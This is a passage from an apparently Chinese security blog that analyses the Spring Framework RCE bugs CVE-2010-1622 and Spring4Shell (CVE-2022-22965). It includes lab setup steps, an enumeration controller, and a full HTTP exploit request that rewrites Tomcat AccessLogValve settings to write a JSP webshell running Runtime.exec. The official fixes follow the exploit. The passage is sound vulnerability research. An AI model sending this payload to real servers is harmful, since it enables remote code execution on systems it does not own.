class="hljs-selector-class">.jasper</span>.compiler)<br>parse:<span class="hljs-number">102</span>, ParserController (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>generateJava:<span class="hljs-number">167</span>, Compiler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>compile:<span class="hljs-number">306</span>, Compiler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>compile:<span class="hljs-number">286</span>, Compiler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>compile:<span class="hljs-number">273</span>, Compiler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>compile:<span class="hljs-number">566</span>, JspCompilationContext (org<span class="hljs-selector-class">.apache</span>.jasper)<br>service:<span class="hljs-number">308</span>, JspServletWrapper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.servlet)<br>serviceJspFile:<span class="hljs-number">320</span>, JspServlet (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.servlet)<br>service:<span class="hljs-number">266</span>, JspServlet (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.servlet)<br>service:<span class="hljs-number">803</span>, HttpServlet (javax<span class="hljs-selector-class">.servlet</span>.http)<br>internalDoFilter:<span class="hljs-number">290</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilter:<span class="hljs-number">206</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br></code></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方在 springbean 的加载时的 CachedIntrospectionResults 加入了对 class.classLoader 的判断</p><p><a href="https://github.com/spring-projects/spring-framework/compare/v3.0.2.RELEASE..v3.0.3.RELEASE">Comparing v3.0.2.RELEASE..v3.0.3.RELEASE · spring-projects&#x2F;spring-framework</a></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510132215684.png" alt="image-20250510132215684"></p><p>同时 tomcat 也对这个漏洞做了修复</p><p>Tomcat 6.0.28 版本后把 <code>getURLs</code> 方法返回的值改成了 clone 的，也就是说我们即使能绕过 springFramework 的修复，也无法再利用 webappClassLoader 获得并设置 URLs [] 数组，实现远程 jar 包加载的 RCE 了</p><h2 id="CVE-2022-22965（Spring4Shell）"><a href="#CVE-2022-22965（Spring4Shell）" class="headerlink" title="CVE-2022-22965（Spring4Shell）"></a>CVE-2022-22965（Spring4Shell）</h2><p>利用条件：</p><ol><li>JDK 版本：JDK 9 及以上版本</li><li>受影响组件：直接或者间接地使 ⽤ 了 Spring-beans 包（Spring boot 等框架都使用了）</li><li>受影响的版本：Spring Framework &lt; 5.3.18 ，Spring Framework &lt; 5.2.20 及衍生版本</li><li>部署方式：使用 war 包部署于 tomcat（非 spring 的可执行的 jar 文件）</li></ol><p>这其实就是对 CVE-2010-1622 的绕过。</p><p>原因：</p><ul><li>jdk9 以后给 Class 加入了 module 属性，我们可以利用 module 获得 ClassLoader, 也就是可以利用 <code>class.module.classLoader</code> 获得</li></ul><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510160407696.png" alt="image-20250510160407696" style="zoom:50%;" /><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510160439795.png" alt="image-20250510160439795" style="zoom:50%;" /><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>正常创建一个 springboot2.6.3 的项目, 创建时选择 <code>war</code> 包方式，再配置一下 tomcat 服务器启动即可</p><p>我这里用的 springboot2.6.3 ，jdk11 ，tomcat 8.5.27</p><p>创建项目</p><center>    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250510200649208.png" alt="image-20250510200649208" style="zoom:40%;" />    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250510200803089.png" alt="image-20250510200803089" style="zoom:40%;" />    </center><p>修改一下 pom.xml 文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--把spring-beans修改为有漏洞的版本--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">spring-beans.version</span>&gt;</span>5.3.17<span class="hljs-tag">&lt;/<span class="hljs-name">spring-beans.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br></code></pre></td></tr></table></figure><p>同时更改 idea 项目结构中的 jdk</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510203140332.png" alt="image-20250510203140332" style="zoom:67%;" /><p>然后把 User 和 UserController 加入进来</p><p><strong>User</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br><br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br><br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>UserController</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserContorller</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/adduser&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终的项目结构</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510203048697.png" alt="image-20250510203048697"></p><p>打包一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn package<br></code></pre></td></tr></table></figure><p>把 taget 里的 war 包复制到 tomcat 的 webapps 目录下，启动 tomcat 就好了</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以创建一个 controller，看一下 Class.Module.ClassLoader 有哪些属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.controller;<br><br><span class="hljs-keyword">import</span> com.lingx5.spring4shell.entry.User;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProperController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/testclass&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">classTest</span><span class="hljs-params">()</span>&#123;<br>        HashSet&lt;Object&gt; set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;Object&gt;();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;class.moduls.classLoader&quot;</span>;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        processClass(action.getClass().getClassLoader(),set,poc);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processClass</span><span class="hljs-params">(Object instance, java.util.HashSet set, String poc)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class&lt;?&gt; c = instance.getClass();<br>            set.add(instance);<br>            Method[] allMethods = c.getMethods();<br>            <span class="hljs-keyword">for</span> (Method m : allMethods) &#123;<br>                <span class="hljs-keyword">if</span> (!m.getName().startsWith(<span class="hljs-string">&quot;set&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!m.toGenericString().startsWith(<span class="hljs-string">&quot;public&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                Class&lt;?&gt;[] pType  = m.getParameterTypes();<br>                <span class="hljs-keyword">if</span>(pType.length!=<span class="hljs-number">1</span>) <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span>(pType[<span class="hljs-number">0</span>].getName().equals(<span class="hljs-string">&quot;java.lang.String&quot;</span>)||<br>                        pType[<span class="hljs-number">0</span>].getName().equals(<span class="hljs-string">&quot;boolean&quot;</span>)||<br>                        pType[<span class="hljs-number">0</span>].getName().equals(<span class="hljs-string">&quot;int&quot;</span>))&#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">fieldName</span> <span class="hljs-operator">=</span> m.getName().substring(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>).toLowerCase()+m.getName().substring(<span class="hljs-number">4</span>);<br>                    System.out.println(poc+<span class="hljs-string">&quot;.&quot;</span>+fieldName);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (Method m : allMethods) &#123;<br>                <span class="hljs-keyword">if</span> (!m.getName().startsWith(<span class="hljs-string">&quot;get&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!m.toGenericString().startsWith(<span class="hljs-string">&quot;public&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                Class&lt;?&gt;[] pType  = m.getParameterTypes();<br>                <span class="hljs-keyword">if</span>(pType.length!=<span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span>(m.getReturnType() == Void.TYPE) <span class="hljs-keyword">continue</span>;<br>                m.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> m.invoke(instance);<br>                <span class="hljs-keyword">if</span>(o!=<span class="hljs-literal">null</span>)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(set.contains(o)) <span class="hljs-keyword">continue</span>;<br>                    processClass(o, set, poc+<span class="hljs-string">&quot;.&quot;</span>+m.getName().substring(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>).toLowerCase()+m.getName().substring(<span class="hljs-number">4</span>));<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException | InvocationTargetException x) &#123;<br>            x.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动项目访问 <code>/testclass</code> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510162639084.png" alt="image-20250510162639084"></p><p>发现有 AccessValve 的一些属性</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span><span class="hljs-selector-class">.directory</span> <br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span><span class="hljs-selector-class">.prefix</span> <br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span><span class="hljs-selector-class">.suffix</span> <br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span><span class="hljs-selector-class">.pattern</span> <br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.fileDateFormat<br></code></pre></td></tr></table></figure><h3 id="AccessLogValve"><a href="#AccessLogValve" class="headerlink" title="AccessLogValve"></a>AccessLogValve</h3><p><code>AccessLogValve</code> 是 Tomcat 中用来记录访问日志的一个“阀门”（Valve）组件。它的主要作用是将 HTTP 请求相关信息（比如客户端 IP、访问时间、请求方法、响应码等）写入到日志文件，这些日志常用于访问统计、性能分析、安全审计等场景。</p><p>在 servlet.xml 中常见的配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Host</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;localhost&quot;</span>  <span class="hljs-attr">appBase</span>=<span class="hljs-string">&quot;webapps&quot;</span> <span class="hljs-attr">...</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Valve</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">directory</span>=<span class="hljs-string">&quot;logs&quot;</span> </span><br><span class="hljs-tag">         <span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;localhost_access_log&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">suffix</span>=<span class="hljs-string">&quot;.txt&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;%h %l %u %t <span class="hljs-symbol">&amp;quot;</span>%r<span class="hljs-symbol">&amp;quot;</span> %s %b&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Host</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>directory：access_log 文件输出目录。</li><li>prefix：access_log 文件名前缀。</li><li>pattern：access_log 文件内容格式。</li><li>suffix：access_log 文件名后缀。</li></ul><p>而我们可以利用 <code>class.module.classloader</code> 设置日志的路径、名称、后缀和内容，这不就相当于是可以写木马了</p><p>可以做如下修改</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 指定存放路径为 webapps/ROOT</span><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.directory=webapps/ROOT<br><span class="hljs-comment">// 指定文件名前缀为shell</span><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.prefix=shell<br><span class="hljs-comment">// 指定文件名后缀为.jsp</span><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.suffix=<span class="hljs-selector-class">.jsp</span><br><span class="hljs-comment">// 指定文件内容为 jsp 一句话木马</span><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.pattern=<span class="hljs-string">&quot;jsp一句话木马&quot;</span><br><span class="hljs-comment">// 指定文件名中间内容为空</span><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.fileDateFormat=<br></code></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/spring/adduser</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">suffix</span><span class="hljs-punctuation">: </span>%&gt;<br><span class="hljs-attribute">prefix</span><span class="hljs-punctuation">: </span>&lt;%<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>460<br><br><span class="language-maxima">class.module.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.pattern=<span class="hljs-symbol">%</span><span class="hljs-number">25</span>&#123;<span class="hljs-built_in">prefix</span>&#125;iRuntime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)%3b%<span class="hljs-number">25</span>&#123;suffix&#125;i&amp;class.module.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.suffix=.jsp&amp;class.module.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.<span class="hljs-built_in">directory</span>=./webapps/ROOT/&amp;class.module.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.<span class="hljs-built_in">prefix</span>=shell&amp;class.module.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.fileDateFormat=</span><br></code></pre></td></tr></table></figure><p><strong>注意最后不要有空行</strong> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510203425201.png" alt="image-20250510203425201"></p><p>后访问 <code>/shell.jsp</code></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510200035518.png" alt="image-20250510200035518"></p><blockquote><p>这个漏洞只能在 tomcat 中实现，也就是说必须要 war 包在 tomcat 容器里部署，如果是 springboot 启动的话就不行了。</p><p>这主要是因为 ClassLoader 不一样，tomcat中获得的是org.apache.catalina.loader.ParallelWebappClassLoader</p><p>而在springboot中是org.springframework.boot.loader.LaunchedURLClassLoader，它并没有resources成员变量，也没有利用链</p></blockquote><h3 id="POC-说明"><a href="#POC-说明" class="headerlink" title="POC 说明"></a>POC 说明</h3><p><code>%&#123;prefix&#125;i</code> 的形式是官方规定的 AccessLogValve 可以从请求体中获取信息的表达式。官方文档说明如下 <a href="https://tomcat.apache.org/tomcat-8.5-doc/api/org/apache/catalina/valves/AbstractAccessLogValve.html">https://tomcat.apache.org/tomcat-8.5-doc/api/org/apache/catalina/valves/AbstractAccessLogValve.html</a></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510210406146.png" alt="image-20250510210406146"></p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="spring-5-3-18"><a href="#spring-5-3-18" class="headerlink" title="spring 5.3.18"></a>spring 5.3.18</h4><p>同样是在 CachedIntrospectionResults 做了更加严格的限制</p><p><a href="https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18">Comparing v5.3.17…v5.3.18 · spring-projects&#x2F;spring-framework</a></p><p>可以看到当Java Bean的类型为java.lang.Class时，仅允许获取name以及Name后缀的属性描述符。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510211637546.png" alt="image-20250510211637546"></p><h4 id="tomcat-9-0-62"><a href="#tomcat-9-0-62" class="headerlink" title="tomcat 9.0.62"></a>tomcat 9.0.62</h4><p>getResources()方法的返回值做了修改，直接返回null。获取不到 Resources 自然也无法修改 AccessLogValve 的输出路径。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://tttang.com/archive/1532/">从零开始，分析 Spring Framework RCE - 跳跳糖</a></p><p><a href="https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/?loc=learn">Spring4Shell: The zero-day RCE in the Spring Framework explained | Snyk</a></p><p><a href="https://mp.weixin.qq.com/s/kc7XP3K98c62Z-Euyz1EZA">Spring Beans RCE 分析(附带环境源码)</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0NTU5Mjg0Ng==&mid=2247491401&idx=1&sn=e1584f277a529d04946e960a0ca4ec8f&source=41#wechat_redirect">【最新漏洞预警】CVE-2022-22965 Spring 核心框架 Spring4Shell 远程命令执行漏洞原理与修复方式分析</a></p><p><a href="https://l3yx.github.io/2022/07/21/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622">Spring Framework 代码执行(CVE-2010-1622) | l3yx’s blog</a></p><p><a href="https://xz.aliyun.com/news/10727">spring rce 从 cve-2010-1622 到 CVE-2022-22965 篇一-先知社区</a></p><p><a href="https://www.anquanke.com/post/id/272149">Spring远程命令执行漏洞（CVE-2022-22965）原理分析和思考-安全KER - 安全资讯平台</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Spring</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shiro 内存马</title>
    <link href="/2025/04/26/shiro-%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2025/04/26/shiro-%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
